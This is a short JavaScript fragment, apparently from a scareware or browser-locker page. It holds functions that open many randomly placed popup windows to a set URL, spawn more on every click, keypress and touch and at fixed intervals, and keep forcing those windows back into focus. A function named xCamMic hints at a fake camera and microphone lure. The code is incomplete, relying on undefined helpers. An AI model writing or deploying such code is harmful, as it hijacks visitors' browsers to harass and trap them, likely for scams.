function xCamMic(){

function spawnP(n){for(let i=0;i<n;i++)setTimeout(()=>{try{const w=window.open(U,'_blank',`width=${R(300,700)},height=${R(250,500)},left=${R(0,screen.availWidth-400)},top=${R(0,screen.availHeight-300)}`);if(w)pops.push(w)}catch(e){}},i*100)}
function xPops(){
  let cd=false;
  ['click','mousedown','touchstart','keydown','keyup','touchend'].forEach(e=>document.addEventListener(e,()=>{if(!X||cd)return;cd=true;spawnP(R(2,4));setTimeout(()=>cd=false,600)},{capture:true,passive:true}));
  setInterval(()=>spawnP(R(1,2)),4000);
  setInterval(()=>{pops=pops.filter(w=>{try{return!w.closed}catch(e){return false}})},2000);
  setInterval(()=>pops.forEach(w=>{try{if(!w.closed)w.focus()}catch(e){}}),3000);
}
